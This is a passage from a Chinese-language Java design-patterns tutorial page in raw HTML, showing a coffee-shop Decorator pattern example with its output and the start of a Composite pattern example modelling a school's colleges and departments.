setPrice(<span class="hljs-number">5.0f</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeCaf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeCaf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Coffee</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeCaf</span><span class="hljs-params">()</span> &#123;<br>      setDes(<span class="hljs-string">&quot; æ— å› å’–å•¡ &quot;</span>);<br>      setPrice(<span class="hljs-number">1.0f</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Decorator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Decorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Drink</span> &#123;<br>    <span class="hljs-keyword">private</span> Drink obj;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Decorator</span><span class="hljs-params">(Drink obj)</span> &#123; <span class="hljs-comment">//ç»„åˆ</span><br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-comment">// getPrice è‡ªå·±ä»·æ ¼</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getPrice() + obj.cost();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-comment">// obj.getDes() è¾“å‡ºè¢«è£…é¥°è€…çš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">return</span> des + <span class="hljs-string">&quot; &quot;</span> + getPrice() + <span class="hljs-string">&quot; &amp;&amp; &quot;</span> + obj.getDes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Milk</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Milk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Decorator</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Milk</span><span class="hljs-params">(Drink obj)</span> &#123;<br>      <span class="hljs-built_in">super</span>(obj);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      setDes(<span class="hljs-string">&quot; ç‰›å¥¶ &quot;</span>);<br>      setPrice(<span class="hljs-number">2.0f</span>); <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Chocolate</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-comment">//å…·ä½“çš„Decoratorï¼Œ è¿™é‡Œå°±æ˜¯è°ƒå‘³å“</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Chocolate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Decorator</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Chocolate</span><span class="hljs-params">(Drink obj)</span> &#123;<br>      <span class="hljs-built_in">super</span>(obj);<br>      setDes(<span class="hljs-string">&quot; å·§å…‹åŠ› &quot;</span>);<br>      setPrice(<span class="hljs-number">3.0f</span>); <span class="hljs-comment">// è°ƒå‘³å“ çš„ä»·æ ¼</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CoffeeBar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoffeeBar</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è£…é¥°è€…æ¨¡å¼ä¸‹çš„è®¢å•ï¼š2ä»½å·§å…‹åŠ›+ä¸€ä»½ç‰›å¥¶çš„LongBlack</span><br><br>      <span class="hljs-comment">// 1. ç‚¹ä¸€ä»½ LongBlack</span><br>      <span class="hljs-type">Drink</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LongBlack</span>();<br>      System.out.println(<span class="hljs-string">&quot;è´¹ç”¨1=&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;æè¿°=&quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 2. order åŠ å…¥ä¸€ä»½ç‰›å¥¶</span><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Milk</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ è´¹ç”¨ =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ æè¿° = &quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 3. order åŠ å…¥ä¸€ä»½å·§å…‹åŠ›</span><br><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chocolate</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥ä¸€ä»½å·§å…‹åŠ›  è´¹ç”¨ =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥ä¸€ä»½å·§å…‹åŠ› æè¿° = &quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 3. order åŠ å…¥ä¸€ä»½å·§å…‹åŠ›</span><br><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chocolate</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥2ä»½å·§å…‹åŠ›   è´¹ç”¨ =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥2ä»½å·§å…‹åŠ› æè¿° = &quot;</span> + order.getDes());<br>   <br>      System.out.println(<span class="hljs-string">&quot;===========================&quot;</span>);<br>      <br>      <span class="hljs-type">Drink</span> <span class="hljs-variable">order2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeCaf</span>();<br>      <br>      System.out.println(<span class="hljs-string">&quot;order2 æ— å› å’–å•¡  è´¹ç”¨ =&quot;</span> + order2.cost());<br>      System.out.println(<span class="hljs-string">&quot;order2 æ— å› å’–å•¡ æè¿° = &quot;</span> + order2.getDes());<br>      <br>      order2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Milk</span>(order2);<br>      <br>      System.out.println(<span class="hljs-string">&quot;order2 æ— å› å’–å•¡ åŠ å…¥ä¸€ä»½ç‰›å¥¶  è´¹ç”¨ =&quot;</span> + order2.cost());<br>      System.out.println(<span class="hljs-string">&quot;order2 æ— å› å’–å•¡ åŠ å…¥ä¸€ä»½ç‰›å¥¶ æè¿° = &quot;</span> + order2.getDes());<br><br>   <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">è´¹ç”¨<span class="hljs-number">1</span>=<span class="hljs-number">5.0</span><br>æè¿°= longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ è´¹ç”¨ =7</span>.<span class="hljs-number">0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ æè¿° =  ç‰›å¥¶  2</span>.<span class="hljs-number">0</span> &amp;&amp;  longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥ä¸€ä»½å·§å…‹åŠ›  è´¹ç”¨ =10</span>.<span class="hljs-number">0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥ä¸€ä»½å·§å…‹åŠ› æè¿° =  å·§å…‹åŠ›  3</span>.<span class="hljs-number">0</span> &amp;&amp;  ç‰›å¥¶  <span class="hljs-number">2.0</span> &amp;&amp;  longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥2</span>ä»½å·§å…‹åŠ›   è´¹ç”¨ =<span class="hljs-number">13.0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">åŠ å…¥ä¸€ä»½ç‰›å¥¶ åŠ å…¥2</span>ä»½å·§å…‹åŠ› æè¿° =  å·§å…‹åŠ›  <span class="hljs-number">3.0</span> &amp;&amp;  å·§å…‹åŠ›  <span class="hljs-number">3.0</span> &amp;&amp;  ç‰›å¥¶  <span class="hljs-number">2.0</span> &amp;&amp;  longblack <br>===========================<br>order2 æ— å› å’–å•¡  è´¹ç”¨ =<span class="hljs-number">1.0</span><br>order2 æ— å› å’–å•¡ æè¿° =  æ— å› å’–å•¡ <br>order2 æ— å› å’–å•¡ åŠ å…¥ä¸€ä»½ç‰›å¥¶  è´¹ç”¨ =<span class="hljs-number">3.0</span><br>order2 æ— å› å’–å•¡ åŠ å…¥ä¸€ä»½ç‰›å¥¶ æè¿° =  ç‰›å¥¶  <span class="hljs-number">2.0</span> &amp;&amp;  æ— å› å’–å•¡ <br></code></pre></td></tr></table></figure><h1 id="ç»„åˆæ¨¡å¼"><a class="markdownIt-Anchor" href="#ç»„åˆæ¨¡å¼"></a> ç»„åˆæ¨¡å¼</h1><p>ç»„åˆæ¨¡å¼ï¼ˆCompositePatternï¼‰ï¼Œåˆå«éƒ¨åˆ†æ•´ä½“æ¨¡å¼ï¼Œæ˜¯ç”¨äºæŠŠä¸€ç»„ç›¸ä¼¼çš„å¯¹è±¡å½“ä½œä¸€ä¸ªå•ä¸€çš„å¯¹è±¡ã€‚ç»„åˆæ¨¡å¼ä¾æ®æ ‘å½¢ç»“æ„æ¥ç»„åˆå¯¹è±¡ï¼Œç”¨æ¥è¡¨ç¤ºéƒ¨åˆ†ä»¥åŠæ•´ä½“å±‚æ¬¡ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒåˆ›å»ºäº†å¯¹è±¡ç»„çš„æ ‘å½¢ç»“æ„ã€‚</p><p>è¿™ç§æ¨¡å¼åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«è‡ªå·±å¯¹è±¡ç»„çš„ç±»ã€‚è¯¥ç±»æä¾›äº†ä¿®æ”¹ç›¸åŒå¯¹è±¡ç»„çš„æ–¹å¼ã€‚</p><h2 id="ä»‹ç»-8"><a class="markdownIt-Anchor" href="#ä»‹ç»-8"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤º&quot;éƒ¨åˆ†-æ•´ä½“&quot;çš„å±‚æ¬¡ç»“æ„ã€‚ç»„åˆæ¨¡å¼ä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ï¼Œå³ï¼šç»„åˆèƒ½è®©å®¢æˆ·ä»¥ä¸€è‡´çš„æ–¹å¼å¤„ç†ä¸ªåˆ«å¯¹è±¡ä»¥åŠç»„åˆå¯¹è±¡ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />å®ƒåœ¨æˆ‘ä»¬æ ‘å‹ç»“æ„çš„é—®é¢˜ä¸­ï¼Œæ¨¡ç³Šäº†ç®€å•å…ƒç´ å’Œå¤æ‚å…ƒç´ çš„æ¦‚å¿µï¼Œå®¢æˆ·ç¨‹åºå¯ä»¥åƒå¤„ç†ç®€å•å…ƒç´ ä¸€æ ·æ¥å¤„ç†å¤æ‚å…ƒç´ ï¼Œä»è€Œä½¿å¾—å®¢æˆ·ç¨‹åºä¸å¤æ‚å…ƒç´ çš„å†…éƒ¨ç»“æ„è§£è€¦ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> 1ã€æ‚¨æƒ³è¡¨ç¤ºå¯¹è±¡çš„éƒ¨åˆ†-æ•´ä½“å±‚æ¬¡ç»“æ„ï¼ˆæ ‘å½¢ç»“æ„ï¼‰ã€‚ 2ã€æ‚¨å¸Œæœ›ç”¨æˆ·å¿½ç•¥ç»„åˆå¯¹è±¡ä¸å•ä¸ªå¯¹è±¡çš„ä¸åŒï¼Œç”¨æˆ·å°†ç»Ÿä¸€åœ°ä½¿ç”¨ç»„åˆç»“æ„ä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> æ ‘æå’Œå¶å­å®ç°ç»Ÿä¸€æ¥å£ï¼Œæ ‘æå†…éƒ¨ç»„åˆè¯¥æ¥å£ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> æ ‘æå†…éƒ¨ç»„åˆè¯¥æ¥å£ï¼Œå¹¶ä¸”å«æœ‰å†…éƒ¨å±æ€§ Listï¼Œé‡Œé¢æ”¾ Componentã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€ç®—æœ¯è¡¨è¾¾å¼åŒ…æ‹¬æ“ä½œæ•°ã€æ“ä½œç¬¦å’Œå¦ä¸€ä¸ªæ“ä½œæ•°ï¼Œå…¶ä¸­ï¼Œå¦ä¸€ä¸ªæ“ä½œæ•°ä¹Ÿå¯ä»¥æ˜¯æ“ä½œæ•°ã€æ“ä½œç¬¦å’Œå¦ä¸€ä¸ªæ“ä½œæ•°ã€‚ 2ã€åœ¨ JAVA AWT å’Œ SWING ä¸­ï¼Œå¯¹äº Button å’Œ Checkbox æ˜¯æ ‘å¶ï¼ŒContainer æ˜¯æ ‘æã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€é«˜å±‚æ¨¡å—è°ƒç”¨ç®€å•ã€‚ 2ã€èŠ‚ç‚¹è‡ªç”±å¢åŠ ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> åœ¨ä½¿ç”¨ç»„åˆæ¨¡å¼æ—¶ï¼Œå…¶å¶å­å’Œæ ‘æçš„å£°æ˜éƒ½æ˜¯å®ç°ç±»ï¼Œè€Œä¸æ˜¯æ¥å£ï¼Œè¿åäº†ä¾èµ–å€’ç½®åŸåˆ™ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> éƒ¨åˆ†ã€æ•´ä½“åœºæ™¯ï¼Œå¦‚æ ‘å½¢èœå•ï¼Œæ–‡ä»¶ã€æ–‡ä»¶å¤¹çš„ç®¡ç†ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> å®šä¹‰æ—¶ä¸ºå…·ä½“ç±»ã€‚</p><p><strong>ç»„åˆæ¨¡å¼åŸç†ç±»å›¾ï¼š</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102185734930.png" alt="image-20230102185734930" /></p><p>å¯¹åŸç†ç»“æ„å›¾çš„è¯´æ˜-å³(ç»„åˆæ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p><strong>Component</strong> :è¿™æ˜¯ç»„åˆä¸­å¯¹è±¡å£°æ˜æ¥å£ï¼Œåœ¨é€‚å½“æƒ…å†µä¸‹ï¼Œå®ç°æ‰€æœ‰ç±»å…±æœ‰çš„æ¥å£é»˜è®¤è¡Œä¸º,ç”¨äºè®¿é—®å’Œç®¡ç†Component å­éƒ¨ä»¶, Component å¯ä»¥æ˜¯æŠ½è±¡ç±»æˆ–è€…æ¥å£</p></li><li><p><strong>Leaf :</strong> åœ¨ç»„åˆä¸­è¡¨ç¤ºå¶å­èŠ‚ç‚¹ï¼Œå¶å­èŠ‚ç‚¹æ²¡æœ‰å­èŠ‚ç‚¹</p></li><li><p><strong>Composite</strong> :éå¶å­èŠ‚ç‚¹ï¼Œ ç”¨äºå­˜å‚¨å­éƒ¨ä»¶ï¼Œ åœ¨ Component æ¥å£ä¸­å®ç° å­éƒ¨ä»¶çš„ç›¸å…³æ“ä½œï¼Œæ¯”å¦‚å¢åŠ (add),åˆ é™¤ã€‚</p></li></ol><h2 id="å®ç°-6"><a class="markdownIt-Anchor" href="#å®ç°-6"></a> å®ç°</h2><ol><li><p><strong>ç¼–å†™ç¨‹åº</strong>å±•ç¤ºä¸€ä¸ªå­¦æ ¡é™¢ç³»ç»“æ„ï¼šéœ€æ±‚æ˜¯è¿™æ ·ï¼Œè¦åœ¨ä¸€ä¸ªé¡µé¢ä¸­å±•ç¤ºå‡ºå­¦æ ¡çš„é™¢ç³»ç»„æˆï¼Œä¸€ä¸ªå­¦æ ¡æœ‰å¤šä¸ªå­¦é™¢ï¼Œä¸€ä¸ªå­¦é™¢æœ‰å¤šä¸ªç³»ã€‚</p></li><li><p>æ€è·¯åˆ†æå’Œå›¾è§£(ç±»å›¾)</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102190822334.png" alt="image-20230102190822334" /></p><p><code>OrganizationComponent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åå­—</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è¯´æ˜</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String des;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>        <span class="hljs-comment">//é»˜è®¤å®ç°</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>        <span class="hljs-comment">//é»˜è®¤å®ç°</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//æ„é€ å™¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrganizationComponent</span><span class="hljs-params">(String name, String des)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDes</span><span class="hljs-params">(String des)</span> &#123;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-comment">//æ–¹æ³•print, åšæˆæŠ½è±¡çš„, å­ç±»éƒ½éœ€è¦å®ç°</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>   <span class="hljs-comment">//æ²¡æœ‰é›†åˆ</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <br>   <span class="hljs-comment">//add , remove å°±ä¸ç”¨å†™äº†ï¼Œå› ä¸ºä»–æ˜¯å¶å­èŠ‚ç‚¹</span><br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(getName());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">College</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>   <span class="hljs-comment">//List ä¸­ å­˜æ”¾çš„Department</span><br>   List&lt;OrganizationComponent&gt; organizationComponents = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;OrganizationComponent&gt;();<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> 